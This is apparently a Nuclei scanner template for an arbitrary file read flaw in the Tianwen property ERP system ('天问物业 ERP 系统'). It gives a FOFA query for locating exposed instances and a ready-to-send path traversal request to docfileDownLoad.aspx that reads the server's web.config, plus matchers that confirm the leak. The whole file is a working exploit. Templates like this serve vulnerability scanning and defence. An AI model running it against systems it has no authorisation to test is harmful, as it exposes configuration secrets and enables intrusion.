id: tianwen-file-read

info:
  name: "天问物业 ERP 系统 docfileDownLoad.aspx 任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="天问物业ERP系统"
      天问物业ERP系统特定版本中存在文件读取漏洞，攻击者可通过构造恶意请求读取服务器任意文件内容，导致敏感数据泄露
  tags: 天问物业 ERP 系统

http:
- raw:
  - |
    GET /HM/M_Main/WorkGeneral/docfileDownLoad.aspx?AdjunctFile=../web.config HTTP/1.1
    Host: {{Hostname}}
    Pragma: no-cache
    Cache-Control: no-cache
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ASP.NET_SessionId=b53o041hohx0qez2eazdoygq
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'configuration'
